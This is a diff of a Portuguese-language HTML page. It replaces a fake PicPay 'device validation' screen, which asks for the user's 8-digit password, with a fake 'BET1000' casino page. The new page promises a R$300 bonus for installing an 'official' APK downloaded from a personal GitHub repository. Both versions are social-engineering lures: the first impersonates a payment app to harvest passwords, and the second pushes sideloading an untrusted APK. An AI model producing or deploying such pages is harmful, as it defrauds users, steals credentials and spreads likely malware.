@@ -2,219 +2,180 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PicPay | Validar Dispositivo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BET1000 | Cassino Oficial</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Goldman:wght@400;700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        
-        :root {
-            --picpay-green: #21C25E;
-            --picpay-dark: #111111;
-            --picpay-gray: #F5F5F5;
-        }
-
-        body, html {
-            height: 100%;
-            margin: 0;
-            background-color: white;
+        body {
             font-family: 'Inter', sans-serif;
-            color: var(--picpay-dark);
-            overflow: hidden;
+            background-color: #050505;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .casino-gradient {
+            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
         }
 
-        .step-container {
-            display: none;
-            flex-direction: column;
-            height: 100%;
-            padding: 0 24px;
+        .gold-text {
+            background: linear-gradient(to bottom, #cf9e2b 0%, #f7e693 50%, #cf9e2b 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .step-active {
-            display: flex;
+        .gold-border {
+            border: 1px solid transparent;
+            background-image: linear-gradient(#111, #111), linear-gradient(to right, #cf9e2b, #f7e693, #cf9e2b);
+            background-origin: border-box;
+            background-clip: content-box, border-box;
         }
 
-        .custom-input {
-            width: 100%;
-            border-bottom: 2px solid #E5E7EB;
-            padding: 16px 0;
-            font-size: 1.5rem;
-            font-weight: 600;
-            letter-spacing: 0.1em;
-            color: var(--picpay-dark);
-            background: transparent;
-            outline: none;
-            transition: border-color 0.3s;
+        .vip-card {
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(207, 158, 43, 0.3);
+            box-shadow: 0 0 40px rgba(207, 158, 43, 0.15);
         }
 
-        .custom-input:focus {
-            border-color: var(--picpay-green);
+        @keyframes gold-pulse {
+            0% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.05); filter: brightness(1.3); }
+            100% { transform: scale(1); filter: brightness(1); }
         }
 
-        .btn-picpay {
-            background-color: var(--picpay-green);
-            color: white;
-            font-weight: 600;
-            padding: 16px;
-            border-radius: 50px;
-            width: 100%;
-            font-size: 1rem;
-            transition: all 0.2s;
+        .btn-bet {
+            background: linear-gradient(135deg, #cf9e2b 0%, #f7e693 50%, #cf9e2b 100%);
+            box-shadow: 0 0 25px rgba(207, 158, 43, 0.5);
+            transition: all 0.3s ease;
         }
 
-        .btn-picpay:disabled {
-            background-color: #E5E7EB;
-            color: #9CA3AF;
+        .btn-bet:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 40px rgba(207, 158, 43, 0.8);
         }
 
-        .progress-indicator {
-            height: 4px;
-            background: #F3F4F6;
-            width: 100%;
-            position: fixed;
-            top: 60px;
-            left: 0;
+        .slot-animation {
+            animation: bounce 2s infinite;
         }
 
-        .progress-bar {
-            height: 100%;
-            background: var(--picpay-green);
-            width: 50%;
-            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        /* Estilo para deixar a senha visível por padrão */
-        input[type="text"].password-style {
-            -webkit-text-security: none;
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
         }
     </style>
 </head>
-<body>
+<body class="casino-gradient antialiased">
 
-    <!-- Header -->
-    <header class="h-[60px] flex items-center px-4 justify-between fixed top-0 w-full bg-white z-20">
-        <button onclick="prevStep()" class="p-2">
-            <i data-lucide="arrow-left" class="w-6 h-6 text-gray-800"></i>
-        </button>
-        <div class="flex items-center gap-1">
-            <svg width="24" height="24" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="512" cy="512" r="512" fill="#21C25E"/>
-                <path d="M700 350H324V674H700V350Z" fill="white"/>
-            </svg>
-            <span class="font-bold text-xl tracking-tight">PicPay</span>
+    <!-- Header Cassino -->
+    <header class="py-10 text-center relative overflow-hidden border-b border-yellow-900/30">
+        <div class="absolute inset-0 opacity-10">
+            <div class="flex flex-wrap justify-around text-4xl gap-10">
+                <i class="fas fa-dice"></i><i class="fas fa-spade"></i><i class="fas fa-coins"></i>
+                <i class="fas fa-diamond"></i><i class="fas fa-heart"></i><i class="fas fa-clover"></i>
+            </div>
         </div>
-        <div class="w-10"></div> <!-- Spacer -->
+        
+        <div class="container mx-auto px-4 relative z-10">
+            <h1 class="text-6xl font-black italic gold-text" style="font-family: 'Goldman', cursive;">
+                BET1000
+            </h1>
+            <p class="text-xs tracking-[0.5em] text-yellow-600 font-bold uppercase mt-2">The Billionaire's Club</p>
+        </div>
     </header>
 
-    <div class="progress-indicator">
-        <div id="progress-bar" class="progress-bar"></div>
-    </div>
+    <main class="container mx-auto px-6 py-12 flex flex-col items-center max-w-lg">
+        
+        <!-- Banner de Bônus VIP -->
+        <div class="w-full vip-card rounded-[3rem] p-8 mb-10 text-center relative overflow-hidden gold-border">
+            <div class="absolute -top-10 -left-10 w-32 h-32 bg-yellow-500 opacity-5 blur-3xl"></div>
+            
+            <div class="mb-6 slot-animation">
+                <i class="fas fa-coins text-6xl text-yellow-500"></i>
+            </div>
 
-    <!-- ETAPA 1: SENHA DE 8 DÍGITOS -->
-    <div id="step1" class="step-container step-active pt-28">
-        <div class="flex flex-col">
-            <h1 class="text-2xl font-bold mb-2">Confirme sua senha</h1>
-            <p class="text-gray-500 text-sm mb-8 leading-relaxed">
-                Para sua segurança, digite sua senha de acesso de 8 dígitos para continuar.
-            </p>
+            <h2 class="text-2xl font-black text-white mb-2 uppercase tracking-tighter">Bônus de Boas-Vindas</h2>
+            <p class="text-gray-400 text-xs font-bold tracking-widest uppercase mb-4">Exclusivo para Novos Usuários</p>
+            
+            <div class="my-4">
+                <span class="text-6xl font-black gold-text">R$ 300,00</span>
+            </div>
+            
+            <p class="text-[10px] text-yellow-600 font-bold italic">RETIRE SEU SALDO IMEDIATAMENTE VIA APP</p>
+        </div>
 
-            <div class="relative mt-4">
-                <input type="text" 
-                       id="pass-8-digits" 
-                       class="custom-input password-style" 
-                       placeholder="00000000" 
-                       maxlength="8" 
-                       inputmode="numeric"
-                       autocomplete="off">
-                <p id="counter" class="text-xs font-medium text-gray-400 mt-3 text-right">0 / 8 dígitos</p>
+        <!-- Call to Action -->
+        <div class="w-full space-y-8">
+            <div class="text-center">
+                <h3 class="text-xl font-bold gold-text uppercase">Acesse o Lobby VIP</h3>
+                <p class="text-gray-500 text-sm mt-1">Instale o APK oficial para ativar seu saldo</p>
+            </div>
+
+            <!-- Botão de Download Oficial -->
+            <a href="http://github.com/Abravaaaa/AAAA/raw/main/Valores%20Bet.apk" class="btn-bet flex items-center justify-center w-full text-black p-5 rounded-2xl shadow-2xl transition-all font-black text-xl gap-4">
+                <i class="fas fa-download"></i>
+                BAIXAR APK E RESGATAR
+            </a>
+
+            <!-- Benefícios do Cassino -->
+            <div class="grid grid-cols-2 gap-4">
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/10 text-center">
+                    <i class="fas fa-bolt-lightning text-yellow-500 mb-2"></i>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-tighter">Saque PIX Instantâneo</p>
+                </div>
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/10 text-center">
+                    <i class="fas fa-shield-halved text-yellow-500 mb-2"></i>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-tighter">Acesso Criptografado</p>
+                </div>
+            </div>
+
+            <!-- Info Adicional -->
+            <div class="p-5 rounded-3xl bg-green-900/10 border border-green-900/30 text-center">
+                <p class="text-[11px] text-green-500 leading-relaxed font-bold">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    Promoção ativa: Bônus de R$ 300,00 creditado após o primeiro login no App.
+                </p>
             </div>
         </div>
 
-        <div class="mt-auto pb-10">
-            <button onclick="nextStep()" id="btn-next" disabled class="btn-picpay">Continuar</button>
+        <!-- Instruções de Instalação -->
+        <div class="mt-16 w-full text-center">
+            <p class="text-[10px] text-gray-600 font-bold tracking-widest uppercase mb-6">Processo de Ativação</p>
+            <div class="flex justify-between items-center gap-2">
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="w-10 h-10 rounded-full border border-yellow-600/50 flex items-center justify-center text-yellow-500 text-xs mb-2">1</div>
+                    <span class="text-[8px] text-gray-500 uppercase">Download</span>
+                </div>
+                <i class="fas fa-chevron-right text-yellow-900 text-[8px]"></i>
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="w-10 h-10 rounded-full border border-yellow-600/50 flex items-center justify-center text-yellow-500 text-xs mb-2">2</div>
+                    <span class="text-[8px] text-gray-500 uppercase">Instalação</span>
+                </div>
+                <i class="fas fa-chevron-right text-yellow-900 text-[8px]"></i>
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="w-10 h-10 rounded-full bg-yellow-500 flex items-center justify-center text-black text-xs font-bold mb-2 shadow-lg">3</div>
+                    <span class="text-[8px] text-yellow-200 uppercase font-bold">Saldo Ativo</span>
+                </div>
+            </div>
         </div>
-    </div>
 
-    <!-- ETAPA 2: CARREGANDO / PROCESSANDO -->
-    <div id="step2" class="step-container pt-28 items-center text-center">
-        <div class="w-16 h-16 border-4 border-gray-100 border-t-[#21C25E] rounded-full animate-spin mb-6"></div>
-        <h1 class="text-xl font-bold">Validando informações</h1>
-        <p class="text-gray-500 text-sm mt-2">Isso leva apenas alguns instantes...</p>
-    </div>
+    </main>
 
-    <!-- TELA DE SUCESSO -->
-    <div id="step-success" class="step-container pt-28 items-center text-center">
-        <div class="w-20 h-20 bg-[#21C25E] rounded-full flex items-center justify-center mb-6">
-            <i data-lucide="shield-check" class="text-white w-12 h-12"></i>
+    <!-- Footer Cassino -->
+    <footer class="mt-20 py-10 bg-black/80 border-t border-yellow-900/20">
+        <div class="container mx-auto px-4 text-center">
+            <div class="flex justify-center gap-6 text-gray-600 mb-6">
+                <i class="fas fa-certificate"></i>
+                <i class="fas fa-handshake"></i>
+                <i class="fas fa-user-shield"></i>
+            </div>
+            <p class="text-yellow-900 text-[10px] font-black tracking-[0.4em] uppercase mb-4">BET1000 OFFICIAL PLATFORM</p>
+            <p class="text-gray-700 text-[9px]">Apenas para maiores de 18 anos. Jogue com responsabilidade.</p>
+            <p class="text-gray-800 text-[8px] mt-2 italic">Promoção de R$ 300 válida apenas para o primeiro acesso via APK.</p>
         </div>
-        <h1 class="text-2xl font-bold">Dispositivo Seguro</h1>
-        <p class="text-gray-500 mt-4 px-4">
-            A proteção avançada foi aplicada com sucesso. Sua conta PicPay está protegida.
-        </p>
-        <div class="mt-10 w-full">
-            <button onclick="location.reload()" class="btn-picpay">Entendido</button>
-        </div>
-    </div>
+    </footer>
 
-    <script>
-        // Inicializa ícones
-        lucide.createIcons();
-
-        let currentStep = 1;
-        const passInput = document.getElementById('pass-8-digits');
-        const btnNext = document.getElementById('btn-next');
-        const progressBar = document.getElementById('progress-bar');
-        const counter = document.getElementById('counter');
-
-        // Lógica do Input de 8 dígitos
-        passInput.addEventListener('input', (e) => {
-            // Garante que apenas números sejam digitados
-            e.target.value = e.target.value.replace(/\D/g, '');
-            
-            const len = e.target.value.length;
-            counter.innerText = `${len} / 8 dígitos`;
-            
-            // Habilita o botão apenas com 8 dígitos
-            btnNext.disabled = len !== 8;
-
-            if(len === 8) {
-                counter.classList.add('text-green-500');
-            } else {
-                counter.classList.remove('text-green-500');
-            }
-        });
-
-        function nextStep() {
-            if (currentStep === 1) {
-                document.getElementById('step1').classList.remove('step-active');
-                document.getElementById('step2').classList.add('step-active');
-                progressBar.style.width = '100%';
-                currentStep = 2;
-
-                // Simulação de processamento
-                setTimeout(() => {
-                    document.getElementById('step2').classList.remove('step-active');
-                    document.getElementById('step-success').classList.add('step-active');
-                    document.querySelector('.progress-indicator').style.display = 'none';
-                }, 2500);
-            }
-        }
-
-        function prevStep() {
-            if (currentStep === 1) {
-                // Ação de voltar para o app original (simulação)
-                console.log("Voltando...");
-            } else if (currentStep === 2) {
-                document.getElementById('step2').classList.remove('step-active');
-                document.getElementById('step1').classList.add('step-active');
-                progressBar.style.width = '50%';
-                currentStep = 1;
-            }
-        }
-
-        // Foco automático ao abrir
-        window.onload = () => passInput.focus();
-    </script>
 </body>
 </html>
